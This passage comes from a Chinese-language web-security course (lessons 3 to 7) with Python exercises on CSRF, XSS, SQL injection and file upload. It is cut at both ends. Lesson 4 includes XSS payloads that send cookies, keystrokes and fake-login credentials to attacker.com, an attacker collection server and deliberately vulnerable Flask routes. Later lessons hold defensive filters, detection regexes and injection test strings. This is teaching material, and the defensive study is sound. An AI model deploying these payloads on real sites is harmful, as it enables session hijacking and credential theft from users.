    valid_referer = defense.validate_referer('https://bank.com/transfer', 'bank.com')
    print(f"Referer验证结果: {valid_referer}")
    
    # SameSite Cookie
    samesite_settings = defense.use_samesite_cookie()
    print(f"SameSite Cookie设置: {samesite_settings}")

讲解要点：
CSRF利用用户已认证状态发起未授权请求
GET型CSRF通过img标签，POST型通过自动提交表单
防御核心：CSRF Token、SameSite Cookie、Referer验证
Token应随机且绑定用户Session

课后任务：编写脚本自动检测目标网站是否存在CSRF漏洞。



第4课：XSS攻击深度剖析

前置知识：第1-3课
下一课衔接：第5课（XSS防御与CSP）

知识点
反射型XSS
存储型XSS
DOM型XSS
XSS Payload构造
XSS绕过技术

代码练习4：XSS攻击与利用

"""
xss_demo.py
功能：XSS三种类型演示与利用
"""

import requests
import re
import html
from flask import Flask, request, render_template_string
from collections import defaultdict

class XSSPayloadGenerator:
    """XSS Payload生成器"""
    
    @staticmethod
    def basic_payloads():
        """基础Payload"""
        return [
            '<script>alert("XSS")</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input type="text" onfocus="alert(1)" autofocus>',
            '<a href="javascript:alert(1)">click</a>'
        ]
    
    @staticmethod
    def cookie_stealer(attacker_server):
        """Cookie窃取Payload"""
        return f'''
        <script>
            var img = new Image();
            img.src = "{attacker_server}/steal?cookie=" + document.cookie;
        </script>
        '''
    
    @staticmethod
    def keylogger_payload():
        """键盘记录Payload"""
        return '''
        <script>
            var keys = '';
            document.onkeypress = function(e) {
                keys += e.key;
                new Image().src = 'http://attacker.com/log?keys=' + keys;
            };
        </script>
        '''
    
    @staticmethod
    def phishing_payload():
        """钓鱼Payload - 伪造登录框"""
        return '''
        <div id="fake-login" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999">
            <h2>会话已过期，请重新登录</h2>
            <input id="user" placeholder="用户名">
            <input id="pass" type="password" placeholder="密码">
            <button onclick="steal()">登录</button>
        </div>
        <script>
            function steal() {
                var u = document.getElementById('user').value;
                var p = document.getElementById('pass').value;
                new Image().src = 'http://attacker.com/steal?user='+u+'&pass='+p;
                document.getElementById('fake-login').style.display = 'none';
            }
        </script>
        '''
    
    @staticmethod
    def dom_based_payload():
        """DOM型XSS Payload"""
        return '#<img src=x onerror=alert(1)>'

class XSSVulnerableApp:
    """存在XSS漏洞的应用"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.comments = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>XSS漏洞演示平台</h2>
            <ul>
                <li><a href="/reflected?q=test">反射型XSS</a></li>
                <li><a href="/stored">存储型XSS（留言板）</a></li>
                <li><a href="/dom">DOM型XSS</a></li>
            </ul>
            '''
        
        @self.app.route('/reflected')
        def reflected():
            """反射型XSS漏洞"""
            q = request.args.get('q', '')
            # 漏洞：直接拼接用户输入
            return f'''
            <h2>搜索结果</h2>
            <p>您搜索了: {q}</p>
            <form>
                <input name="q" value="{q}">
                <input type="submit">
            </form>
            <a href="/">返回</a>
            '''
        
        @self.app.route('/stored', methods=['GET', 'POST'])
        def stored():
            """存储型XSS漏洞（留言板）"""
            if request.method == 'POST':
                name = request.form.get('name', '匿名')
                msg = request.form.get('message', '')
                # 漏洞：直接存储，未过滤
                self.comments.append({'name': name, 'msg': msg})
            
            # 显示留言
            html = '''
            <h2>留言板（存储型XSS）</h2>
            <form method="post">
                昵称: <input name="name"><br>
                留言: <textarea name="message" rows="3" cols="50"></textarea><br>
                <input type="submit" value="留言">
            </form>
            <hr>
            '''
            for c in self.comments:
                # 漏洞：直接输出，未转义
                html += f'<div><b>{c["name"]}</b>: {c["msg"]}</div>\n'
            html += '<a href="/">返回</a>'
            return render_template_string(html)
        
        @self.app.route('/dom')
        def dom():
            """DOM型XSS"""
            return '''
            <h2>DOM型XSS演示</h2>
            <p>请在URL后添加 #<内容></p>
            <div id="output"></div>
            <script>
                // 从URL片段获取内容并插入DOM
                var content = location.hash.substring(1);
                document.getElementById('output').innerHTML = '你输入了: ' + content;
            </script>
            <a href="/">返回</a>
            '''
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class XSSDetector:
    """XSS漏洞检测器"""
    
    def __init__(self):
        self.session = requests.Session()
    
    def scan_reflected(self, target_url, param_name, test_payloads=None):
        """扫描反射型XSS"""
        if test_payloads is None:
            test_payloads = XSSPayloadGenerator.basic_payloads()[:5]
        
        vulnerabilities = []
        for payload in test_payloads:
            params = {param_name: payload}
            try:
                response = self.session.get(target_url, params=params)
                # 检查Payload是否未编码地出现在响应中
                if payload in response.text:
                    # 进一步确认是否执行（实际需验证）
                    vulnerabilities.append({
                        'payload': payload,
                        'url': response.url,
                        'reflected': True
                    })
            except:
                pass
        return vulnerabilities
    
    def scan_stored(self, submit_url, view_url, test_payloads=None):
        """扫描存储型XSS"""
        if test_payloads is None:
            test_payloads = XSSPayloadGenerator.basic_payloads()[:3]
        
        vulnerabilities = []
        for payload in test_payloads:
            # 提交包含Payload的内容
            try:
                submit_data = {'name': 'test', 'message': payload}
                self.session.post(submit_url, data=submit_data)
                
                # 检查是否在页面中
                response = self.session.get(view_url)
                if payload in response.text:
                    vulnerabilities.append({
                        'payload': payload,
                        'stored': True
                    })
            except:
                pass
        return vulnerabilities

class XSSDefense:
    """XSS防御实现"""
    
    @staticmethod
    def html_escape(input_str):
        """HTML转义"""
        return html.escape(input_str)
    
    @staticmethod
    def js_escape(input_str):
        """JavaScript转义"""
        import json
        return json.dumps(input_str)[1:-1]
    
    @staticmethod
    def attribute_escape(input_str):
        """HTML属性转义"""
        # 转义引号
        return input_str.replace('"', '&quot;').replace("'", '&#39;')
    
    @staticmethod
    def csp_headers():
        """Content-Security-Policy头"""
        return {
            'Content-Security-Policy': "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'"
        }
    
    @staticmethod
    def safe_dom_insertion(user_input):
        """安全的DOM插入"""
        # 使用textContent代替innerHTML
        return f'''
        <script>
            document.getElementById('output').textContent = {repr(user_input)};
        </script>
        '''

class XSSAttackServer:
    """模拟攻击者服务器，接收窃取的数据"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.stolen_data = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/steal')
        def steal():
            data = request.args.get('cookie', '') or request.args.get('data', '')
            print(f"[!] 窃取到数据: {data}")
            self.stolen_data.append(data)
            return 'OK'
        
        @self.app.route('/log')
        def log():
            keys = request.args.get('keys', '')
            print(f"[!] 键盘记录: {keys}")
            return 'OK'
    
    def run(self, port=8000):
        self.app.run(port=port, debug=False)

if __name__ == "__main__":
    # 练习1：生成XSS Payload
    print("="*50)
    print("练习1：XSS Payload生成")
    generator = XSSPayloadGenerator()
    print("基础Payload:")
    for p in generator.basic_payloads()[:3]:
        print(f"  {p[:50]}...")
    
    print(f"\nCookie窃取Payload: {generator.cookie_stealer('http://attacker.com')[:80]}...")
    
    # 练习2：启动漏洞应用进行测试
    print("\n" + "="*50)
    print("练习2：XSS漏洞扫描")
    
    import threading
    vuln_app = XSSVulnerableApp()
    thread = threading.Thread(target=vuln_app.run, args=(5003,))
    thread.daemon = True
    thread.start()
    time.sleep(2)
    
    scanner = XSSDetector()
    results = scanner.scan_reflected('http://127.0.0.1:5003/reflected', 'q')
    print("反射型XSS扫描结果:")
    for r in results:
        print(f"  发现漏洞: {r['payload'][:50]}")
    
    # 练习3：XSS防御
    print("\n" + "="*50)
    print("练习3：XSS防御方案")
    defense = XSSDefense()
    
    malicious = "<script>alert('XSS')</script>"
    escaped = defense.html_escape(malicious)
    print(f"原始: {malicious}")
    print(f"HTML转义后: {escaped}")
    print(f"CSP头: {defense.csp_headers()}")

讲解要点：
三种XSS类型的区别：反射（URL参数）、存储（持久化）、DOM（客户端）
XSS危害包括窃取Cookie、键盘记录、钓鱼
防御核心：输出转义、CSP、HttpOnly Cookie
DOM型XSS需要关注客户端JavaScript代码

课后任务：在DVWA靶场完成XSS模块的所有难度级别。


第5课：XSS防御与CSP实战

前置知识：第4课（XSS攻击）
下一课衔接：第6课（SQL注入防御）

知识点
HTML实体编码与上下文转义
Content Security Policy（CSP）详解
HttpOnly与Secure Cookie
XSS过滤器实现
富文本XSS防护

代码练习5：XSS防御系统


"""
xss_defense_system.py
功能：完整的XSS防御系统实现
"""

import re
import html
import hashlib
import json
from flask import Flask, request, make_response, render_template_string
from urllib.parse import urlparse

class XSSDefenseSystem:
    """XSS综合防御系统"""
    
    # 白名单标签（用于富文本）
    ALLOWED_TAGS = {
        'b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li',
        'a', 'img', 'div', 'span', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'
    }
    
    # 白名单属性
    ALLOWED_ATTRIBUTES = {
        'a': ['href', 'title'],
        'img': ['src', 'alt', 'width', 'height'],
        'div': ['class', 'id'],
        'span': ['class', 'id']
    }
    
    # 危险协议黑名单
    DANGEROUS_PROTOCOLS = ['javascript:', 'data:', 'vbscript:', 'file:']
    
    @staticmethod
    def html_escape_context(context, context_type='html'):
        """
        根据上下文进行转义
        context_type: html, attribute, javascript, css, url
        """
        if context_type == 'html':
            return html.escape(context)
        elif context_type == 'attribute':
            # HTML属性转义
            escaped = html.escape(context)
            # 额外处理引号
            escaped = escaped.replace('"', '&quot;').replace("'", '&#39;')
            return escaped
        elif context_type == 'javascript':
            # JavaScript字符串转义
            return json.dumps(context)[1:-1]
        elif context_type == 'css':
            # CSS转义
            return re.sub(r'[\\()]', lambda m: '\\' + m.group(0), context)
        elif context_type == 'url':
            from urllib.parse import quote
            return quote(context)
        return context
    
    @staticmethod
    def sanitize_rich_text(html_content):
        """
        清洗富文本内容（白名单模式）
        """
        from bs4 import BeautifulSoup, Comment
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # 删除注释
        for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
            comment.extract()
        
        # 遍历所有标签
        for tag in soup.find_all():
            if tag.name not in XSSDefenseSystem.ALLOWED_TAGS:
                tag.unwrap()  # 保留内容但删除标签
                continue
            
            # 清理属性
            allowed_attrs = XSSDefenseSystem.ALLOWED_ATTRIBUTES.get(tag.name, [])
            attrs_to_remove = []
            for attr in tag.attrs:
                if attr not in allowed_attrs:
                    attrs_to_remove.append(attr)
                else:
                    # 检查属性值是否包含危险协议
                    attr_value = tag.attrs[attr]
                    for proto in XSSDefenseSystem.DANGEROUS_PROTOCOLS:
                        if attr_value.lower().startswith(proto):
                            attrs_to_remove.append(attr)
                            break
            
            for attr in attrs_to_remove:
                del tag.attrs[attr]
        
        return str(soup)
    
    @staticmethod
    def generate_csp_header(policy_type='strict'):
        """
        生成CSP头
        policy_type: strict, moderate, permissive
        """
        if policy_type == 'strict':
            return {
                'Content-Security-Policy': "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
            }
        elif policy_type == 'moderate':
            return {
                'Content-Security-Policy': "default-src 'self'; script-src 'self' https://cdn.trusted.com; style-src 'self' 'unsafe-inline'; img-src * data:;"
            }
        else:
            return {
                'Content-Security-Policy': "default-src *; script-src * 'unsafe-inline' 'unsafe-eval'"
            }
    
    @staticmethod
    def generate_nonce():
        """生成CSP nonce"""
        import secrets
        return secrets.token_hex(16)
    
    @staticmethod
    def set_secure_cookie(response, name, value, **kwargs):
        """设置安全的Cookie"""
        response.set_cookie(
            name, value,
            httponly=True,
            secure=True,
            samesite='Strict',
            **kwargs
        )
        return response

class XSSDefenseMiddleware:
    """Flask XSS防御中间件"""
    
    def __init__(self, app):
        self.app = app
        self.setup_csp()
    
    def setup_csp(self):
        """设置CSP中间件"""
        @self.app.after_request
        def add_csp_headers(response):
            csp_headers = XSSDefenseSystem.generate_csp_header('strict')
            for key, value in csp_headers.items():
                response.headers[key] = value
            return response
    
    def run(self, port=5000):
        self.app.run(debug=True, port=port)

class XSSFilter:
    """XSS过滤器实现"""
    
    @staticmethod
    def filter_script_tags(content):
        """过滤script标签"""
        patterns = [
            r'<script[^>]*>.*?</script>',  # 完整script标签
            r'javascript:',                   # javascript协议
            r'on\w+\s*=',                    # 事件处理器
            r'<iframe[^>]*>',                # iframe标签
            r'<object[^>]*>',                # object标签
            r'<embed[^>]*>',                 # embed标签
            r'<form[^>]*>'                   # form标签（可能用于CSRF）
        ]
        for pattern in patterns:
            content = re.sub(pattern, '', content, flags=re.IGNORECASE | re.DOTALL)
        return content
    
    @staticmethod
    def filter_encoded_payload(content):
        """过滤编码后的Payload"""
        # 解码常见编码
        import urllib.parse
        decoded = urllib.parse.unquote(content)
        
        # 检测可疑模式
        suspicious = [
            '<script', '</script>', 'javascript:', 'onerror=', 'onload=',
            'onclick=', 'onmouseover=', 'alert(', 'confirm(', 'prompt(',
            'document.cookie', 'localStorage', 'sessionStorage'
        ]
        
        for pattern in suspicious:
            if pattern.lower() in decoded.lower():
                return False
        return True

class SecureCommentSystem:
    """安全的留言板系统（综合防御）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.app.secret_key = hashlib.sha256(b'secure_secret_key').hexdigest()
        self.comments = []
        self.setup_routes()
    
    def setup_routes(self):
        @self.app.route('/')
        def index():
            return '''
            <h2>安全留言板（XSS防御演示）</h2>
            <a href="/comment">发表留言</a> | <a href="/list">查看留言</a>
            '''
        
        @self.app.route('/comment', methods=['GET', 'POST'])
        def comment():
            if request.method == 'POST':
                name = request.form.get('name', '匿名')
                content = request.form.get('content', '')
                
                # 第1层防御：输入过滤
                if not XSSFilter.filter_encoded_payload(content):
                    return '内容包含可疑代码', 400
                
                # 第2层防御：清洗富文本
                safe_content = XSSDefenseSystem.sanitize_rich_text(content)
                safe_name = XSSDefenseSystem.html_escape_context(name, 'html')
                
                self.comments.append({
                    'name': safe_name,
                    'content': safe_content,
                    'timestamp': __import__('time').time()
                })
                return '留言成功！<a href="/list">查看留言</a>'
            
            return '''
            <h2>发表留言</h2>
            <form method="post">
                昵称: <input name="name"><br>
                内容: <textarea name="content" rows="5" cols="50"></textarea><br>
                <small>支持HTML标签: b, i, u, a, img等</small><br>
                <input type="submit" value="提交">
            </form>
            <a href="/">返回</a>
            '''
        
        @self.app.route('/list')
        def list_comments():
            html = '<h2>留言列表</h2>'
            for c in self.comments:
                html += f'''
                <div style="border:1px solid #ccc; margin:10px; padding:10px;">
                    <b>{c['name']}</b> ({__import__('datetime').datetime.fromtimestamp(c['timestamp'])}):<br>
                    <div>{c['content']}</div>
                </div>
                '''
            html += '<a href="/">返回</a>'
            
            response = make_response(html)
            # 添加CSP头
            csp_headers = XSSDefenseSystem.generate_csp_header('moderate')
            for k, v in csp_headers.items():
                response.headers[k] = v
            return response
    
    def run(self, port=5004):
        self.app.run(debug=True, port=port)

def test_xss_defense():
    """测试XSS防御效果"""
    defense = XSSDefenseSystem()
    
    print("="*50)
    print("XSS防御系统测试")
    
    # 测试1：HTML转义
    malicious = '<script>alert("XSS")</script>'
    print(f"\n测试1 - HTML转义")
    print(f"  输入: {malicious}")
    print(f"  转义后: {defense.html_escape_context(malicious, 'html')}")
    
    # 测试2：富文本清洗
    rich_content = '''
    <p>正常内容</p>
    <script>alert('evil')</script>
    <img src="x" onerror="alert(1)">
    <a href="javascript:alert('XSS')">恶意链接</a>
    <b>加粗文本</b>
    '''
    print(f"\n测试2 - 富文本清洗")
    print(f"  输入: {rich_content[:80]}...")
    sanitized = defense.sanitize_rich_text(rich_content)
    print(f"  清洗后: {sanitized[:80]}...")
    
    # 测试3：CSP头生成
    print(f"\n测试3 - CSP头")
    csp = defense.generate_csp_header('strict')
    print(f"  严格策略: {csp['Content-Security-Policy']}")
    
    # 测试4：Nonce生成
    nonce = defense.generate_nonce()
    print(f"\n测试4 - CSP Nonce")
    print(f"  生成的Nonce: {nonce}")
    
    # 测试5：XSS过滤器
    filter = XSSFilter()
    print(f"\n测试5 - XSS过滤器")
    test_payload = '<img src=x onerror=alert(1)>'
    is_safe = filter.filter_encoded_payload(test_payload)
    print(f"  Payload: {test_payload}")
    print(f"  检测结果: {'安全' if is_safe else '危险'}")

if __name__ == "__main__":
    test_xss_defense()
    
    # 启动安全留言板
    print("\n" + "="*50)
    print("启动安全留言板系统...")
    secure_board = SecureCommentSystem()
    
    import threading
    thread = threading.Thread(target=secure_board.run, args=(5004,))
    thread.daemon = True
    thread.start()
    
    print("安全留言板运行在 http://127.0.0.1:5004")
    print("演示XSS防御效果")

讲解要点：
输出转义是防御XSS的根本，必须根据上下文选择正确的转义方式
CSP作为深度防御机制，可阻止未知XSS的执行
富文本场景需使用白名单过滤而非黑名单
防御应多层：输入过滤+输出转义+CSP+HttpOnly Cookie

课后任务：实现一个支持Markdown的评论系统，确保不被XSS攻击。



第6课：SQL注入防御与参数化查询

前置知识：SQL注入基础
下一课衔接：第7课（文件上传防御）

知识点
参数化查询原理
ORM安全使用
存储过程安全
输入验证与白名单
WAF绕过与防御

代码练习6：SQL注入防御系统


"""
sql_defense_system.py
功能：SQL注入防御与参数化查询实现
"""

import re
import sqlite3
import hashlib
from contextlib import contextmanager
from flask import Flask, request, jsonify

class ParameterizedQuery:
    """参数化查询示例"""
    
    @staticmethod
    def sqlite_example():
        """SQLite参数化查询"""
        conn = sqlite3.connect(':memory:')
        cursor = conn.cursor()
        
        # 创建表
        cursor.execute('''
            CREATE TABLE users (
                id INTEGER PRIMARY KEY,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        
        # 插入数据 - 使用参数化查询
        users = [('alice', 'pass123'), ('bob', 'pass456'), ('admin', 'admin123')]
        cursor.executemany('INSERT INTO users (username, password) VALUES (?, ?)', users)
        conn.commit()
        
        # 安全查询 - 使用参数
        def safe_query(username):
            cursor.execute('SELECT * FROM users WHERE username = ?', (username,))
            return cursor.fetchone()
        
        # 不安全查询 - 字符串拼接
        def unsafe_query(username):
            cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
            return cursor.fetchone()
        
        return safe_query, unsafe_query
    
    @staticmethod
    def mysql_example():
        """MySQL参数化查询（使用pymysql）"""
        try:
            import pymysql
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # 正确方式：使用参数元组
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False
    
    @staticmethod
    def postgresql_example():
        """PostgreSQL参数化查询（使用psycopg2）"""
        try:
            import psycopg2
            # 参数化查询模板
            query_template = "SELECT * FROM users WHERE username = %s"
            # cursor.execute(query_template, (username,))
            return True
        except ImportError:
            return False

class SQLInjectionDetector:
    """SQL注入检测器"""
    
    # SQL注入特征模式
    SQL_PATTERNS = [
        r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # 引号和注释
        r"(\%3D)|(=)|(\%3E)|(>)|(\%3C)|(<)",  # 比较运算符
        r"(\%20)|(\s)+(OR|AND)(\s)+(\d+|=)",  # OR/AND条件
        r"UNION(\s)+(ALL|SELECT|DISTINCT)",  # UNION注入
        r"SELECT(\s)+.*(\s)+FROM",  # SELECT注入
        r"INSERT(\s)+INTO",  # INSERT注入
        r"UPDATE(\s)+.*(\s)+SET",  # UPDATE注入
        r"DELETE(\s)+FROM",  # DELETE注入
        r"DROP(\s)+TABLE",  # DROP注入
        r"EXEC(\s)+.*(\s)+",  # 执行命令
        r"xp_cmdshell",  # SQL Server命令执行
        r"WAITFOR(\s)+DELAY",  # 时间盲注
        r"BENCHMARK\((\d)+,",  # MySQL基准测试
        r"DBMS_PIPE\.RECEIVE_MESSAGE",  # Oracle管道
        r"pg_sleep",  # PostgreSQL睡眠
    ]
    
    @classmethod
    def detect_injection(cls, user_input):
        """检测用户输入是否包含SQL注入特征"""
        if not user_input or not isinstance(user_input, str):
            return False
        
        for pattern in cls.SQL_PATTERNS:
            if re.search(pattern, user_input, re.IGNORECASE):
                return True
        return False
    
    @classmethod
    def sanitize_input(cls, user_input):
        """清理SQL注入特征"""
        if not user_input:
            return user_input
        
        # 转义特殊字符
        sanitized = user_input.replace("'", "''")
        sanitized = sanitized.replace("\\", "\\\\")
        
        # 移除SQL关键字（简单处理）
        sql_keywords = ['OR', 'AND', 'SELECT', 'UNION', 'INSERT', 'DELETE', 
                        'UPDATE', 'DROP', 'CREATE', 'ALTER', 'EXEC', 'EXECUTE']
        for keyword in sql_keywords:
            sanitized = re.sub(rf'\b{keyword}\b', '', sanitized, flags=re.IGNORECASE)
        
        return sanitized

class ORMSafetyChecker:
    """ORM安全使用检查器"""
    
    @staticmethod
    def sqlalchemy_safe():
        """SQLAlchemy安全用法"""
        # 安全：使用参数绑定
        # session.query(User).filter(User.username == username)
        
        # 危险：字符串拼接
        # session.execute(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def django_safe():
        """Django ORM安全用法"""
        # 安全：使用参数化
        # User.objects.filter(username=username)
        
        # 危险：使用raw()拼接
        # User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass
    
    @staticmethod
    def peewee_safe():
        """Peewee ORM安全用法"""
        # 安全：使用参数化
        # User.select().where(User.username == username)
        
        # 危险：使用raw()拼接
        # User.raw(f"SELECT * FROM users WHERE username = '{username}'")
        pass

class SecureDatabaseAPI:
    """安全的数据库API实现"""
    
    def __init__(self, db_path=':memory:'):
        self.conn = sqlite3.connect(db_path)
        self._init_db()
    
    def _init_db(self):
        """初始化数据库"""
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL,
                email TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS products (
                id INTEGER PRIMARY KEY,
                name TEXT NOT NULL,
                price REAL NOT NULL,
                category TEXT
            )
        ''')
        self.conn.commit()
    
    @contextmanager
    def get_cursor(self):
        """获取数据库游标"""
        cursor = self.conn.cursor()
        try:
            yield cursor
            self.conn.commit()
        except Exception as e:
            self.conn.rollback()
            raise e
        finally:
            cursor.close()
    
    def safe_query(self, query, params=None):
        """
        安全的参数化查询
        """
        if params is None:
            params = []
        
        # 检测SQL注入
        for param in params:
            if isinstance(param, str) and SQLInjectionDetector.detect_injection(param):
                raise ValueError(f"检测到SQL注入: {param}")
        
        with self.get_cursor() as cursor:
            cursor.execute(query, params)
            return cursor.fetchall()
    
    def get_user_by_username(self, username):
        """安全地获取用户"""
        query = "SELECT * FROM users WHERE username = ?"
        return self.safe_query(query, (username,))
    
    def search_products(self, keyword, category=None):
        """安全地搜索产品"""
        query = "SELECT * FROM products WHERE name LIKE ?"
        params = [f'%{keyword}%']
        
        if category:
            query += " AND category = ?"
            params.append(category)
        
        return self.safe_query(query, params)
    
    def get_users_paginated(self, limit, offset):
        """分页查询（参数必须为整数）"""
        # 验证参数类型
        if not isinstance(limit, int) or not isinstance(offset, int):
            raise TypeError("limit和offset必须是整数")
        
        query = "SELECT * FROM users LIMIT ? OFFSET ?"
        return self.safe_query(query, (limit, offset))
    
    def get_order_by(self, column, order='ASC'):
        """
        动态排序（使用白名单）
        """
        # 白名单验证
        allowed_columns = ['id', 'username', 'created_at']
        if column not in allowed_columns:
            raise ValueError(f"不支持的排序字段: {column}")
        
        allowed_order = ['ASC', 'DESC']
        if order.upper() not in allowed_order:
            raise ValueError(f"不支持的排序方向: {order}")
        
        # 安全地拼接（已验证的列名）
        query = f"SELECT * FROM users ORDER BY {column} {order}"
        return self.safe_query(query)

class SQLVulnerableApp:
    """存在SQL注入漏洞的应用（用于演示）"""
    
    def __init__(self):
        self.app = Flask(__name__)
        self.db = SecureDatabaseAPI()
        self._init_test_data()
        self.setup_routes()
    
    def _init_test_data(self):
        """初始化测试数据"""
        # 添加测试用户
        test_users = [
            ('admin', hashlib.md5('admin123'.encode()).hexdigest(), 'admin@example.com'),
            ('alice', hashlib.md5('alice123'.encode()).hexdigest(), 'alice@example.com'),
            ('bob', hashlib.md5('bob123'.encode()).hexdigest(), 'bob@example.com')
        ]
        
        for username, password, email in test_users:
            try:
                self.db.safe_query(
                    "INSERT INTO users (username, password, email) VALUES (?, ?, ?)",
                    (username, password, email)
                )
            except:
                pass
    
    def setup_routes(self):
        @self.app.route('/search')
        def search():
            """安全搜索"""
            keyword = request.args.get('q', '')
            try:
                results = self.db.search_products(keyword)
                return jsonify({'results': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/user/<username>')
        def get_user(username):
            """安全获取用户"""
            try:
                results = self.db.get_user_by_username(username)
                if results:
                    return jsonify({'user': results[0]})
                return jsonify({'error': '用户不存在'}), 404
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/users')
        def list_users():
            """分页列表（安全）"""
            try:
                page = int(request.args.get('page', 1))
                per_page = int(request.args.get('per_page', 10))
                offset = (page - 1) * per_page
                
                results = self.db.get_users_paginated(per_page, offset)
                return jsonify({'users': results, 'page': page})
            except (TypeError, ValueError) as e:
                return jsonify({'error': str(e)}), 400
        
        @self.app.route('/sort')
        def sort_users():
            """排序（白名单验证）"""
            column = request.args.get('by', 'id')
            order = request.args.get('order', 'ASC')
            
            try:
                results = self.db.get_order_by(column, order)
                return jsonify({'users': results})
            except ValueError as e:
                return jsonify({'error': str(e)}), 400
    
    def run(self, port=5005):
        self.app.run(debug=True, port=port)

class SQLInjectionDefenseCheatsheet:
    """SQL注入防御速查表"""
    
    @staticmethod
    def best_practices():
        """最佳实践"""
        practices = {
            "DO_use_parameterized_queries": """
                # 正确：使用参数化查询
                cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
            """,
            "DONOT_string_concat": """
                # 错误：字符串拼接
                cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
            """,
            "DO_validate_input_type": """
                # 正确：验证输入类型
                if not isinstance(user_id, int):
                    raise TypeError("ID必须是整数")
            """,
            "DO_use_whitelist_for_dynamic": """
                # 正确：动态表名/列名使用白名单
                allowed_columns = ['id', 'name', 'email']
                if column not in allowed_columns:
                    raise ValueError("无效的列名")
            """,
            "DO_limit_database_privileges": """
                # 正确：使用最小权限原则
                # 应用数据库账户只有SELECT/INSERT/UPDATE权限
            """,
            "DO_use_ORM_safely": """
                # 正确：使用ORM的参数化接口
                User.objects.filter(username=username)
            """
        }
        return practices

def test_sql_injection_detection():
    """测试SQL注入检测"""
    detector = SQLInjectionDetector()
    
    print("="*50)
    print("SQL注入检测测试")
    
    test_cases = [
        ("正常输入", "hello world", False),
        ("引号注入", "admin' OR '1'='1", True),
        ("注释注入", "admin' --", True),
        ("UNION注入", "1 UNION SELECT * FROM users", True),
        ("布尔注入", "1 AND 1=1", True),
        ("时间盲注", "1 AND SLEEP(5)", True),
        ("堆叠查询", "1; DROP TABLE users", True),
        ("编码注入", "%27%20OR%20%271%27=%271", True),
    ]
    
    for name, input_str, expected in test_cases:
        result = detector.detect_injection(input_str)
        status = "✓" if result == expected else "✗"
        print(f"{status} {name}: {result} (预期: {expected})")
        if result:
            print(f"    输入: {input_str[:50]}")

def demo_parameterized_queries():
    """演示参数化查询"""
    print("\n" + "="*50)
    print("参数化查询演示")
    
    # 获取参数化查询示例
    safe_query, unsafe_query = ParameterizedQuery.sqlite_example()
    
    # 正常查询
    print("\n正常查询:")
    print(f"  安全查询: {safe_query('alice')}")
    print(f"  不安全查询: {unsafe_query('alice')}")
    
    # SQL注入攻击演示
    malicious = "admin' OR '1'='1"
    print(f"\n恶意输入: {malicious}")
    
    try:
        result = safe_query(malicious)
        print(f"  安全查询结果: {result} (未注入)")
    except Exception as e:
        print(f"  安全查询错误: {e}")
    
    try:
        result = unsafe_query(malicious)
        print(f"  不安全查询结果: {result} (注入成功)")
    except Exception as e:
        print(f"  不安全查询错误: {e}")

if __name__ == "__main__":
    # 测试SQL注入检测
    test_sql_injection_detection()
    
    # 演示参数化查询
    demo_parameterized_queries()
    
    # 启动安全API
    print("\n" + "="*50)
    print("启动安全数据库API...")
    api_app = SQLVulnerableApp()
    
    import threading
    thread = threading.Thread(target=api_app.run, args=(5005,))
    thread.daemon = True
    thread.start()
    
    print("API运行在 http://127.0.0.1:5005")
    print("\nSQL注入防御最佳实践:")
    for name, practice in SQLInjectionDefenseCheatsheet.best_practices().items():
        print(f"\n{name}:")
        print(practice.strip())

讲解要点：
参数化查询是防御SQL注入最有效的方法
ORM不能自动防御SQL注入，需正确使用参数绑定
动态表名/列名必须使用白名单验证
输入验证与参数化查询结合使用效果更好

课后任务：将现有使用字符串拼接的数据库操作改写为参数化查询。



第7课：文件上传漏洞深度防御

前置知识：第4周内容（文件上传）
下一课衔接：第8课（代码审计实战）

知识点
文件类型多重验证
内容安全检测（魔数、图片检测）
文件名随机化与路径安全
上传目录权限控制
云存储安全上传

代码练习7：安全文件上传系统


"""
secure_file_upload.py
功能：安全的文件上传系统实现
"""

import os
import re
import uuid
import magic
import hashlib
import imghdr
import zipfile
from PIL import Image
from flask import Flask, request, render_template_string, jsonify, send_from_directory
from werkzeug.utils import secure_filename

class SecureFileUpload:
    """安全文件上传处理器"""
    
    # 允许的文件类型（白名单）
    ALLOWED_MIMES = {
        'image/jpeg': 'jpg',
        'image/png': 'png',
        'image/gif': 'gif',
        'image/webp': 'webp',
        'application/pdf': 'pdf',
        'text/plain': 'txt',
        'application/msword': 'doc',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'docx'
    }
    
    # 允许的文件扩展名
    ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp', 'pdf', 'txt', 'doc', 'docx'}
    
    # 最大文件大小（5MB）
